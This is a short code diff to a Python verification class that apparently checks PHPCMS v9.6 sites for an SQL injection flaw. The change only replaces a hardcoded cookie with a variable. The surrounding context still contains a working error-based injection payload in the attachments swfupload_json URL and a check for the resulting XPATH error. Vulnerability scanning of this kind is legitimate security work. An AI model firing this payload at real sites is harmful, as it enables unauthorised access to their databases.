@@ -32,7 +32,7 @@ class phpcms_v96_sqli_BaseVerify:
         except:
             pass
         post_data = {
-            "userid_flash":"7a3f_ZZKe4LtqXG4yma6EL6zh4ABX_J7pVEYOaS4"
+            "userid_flash":tmp_cookie
         }
         url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
         try:
@@ -42,7 +42,7 @@ class phpcms_v96_sqli_BaseVerify:
         except:
             pass
         
-        vulnurl = self.url + "/index.php?m=content&c=down&a_k="+tmp_cookie
+        vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)
         try:
             req3 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"XPATH syntax error" in req3.text:
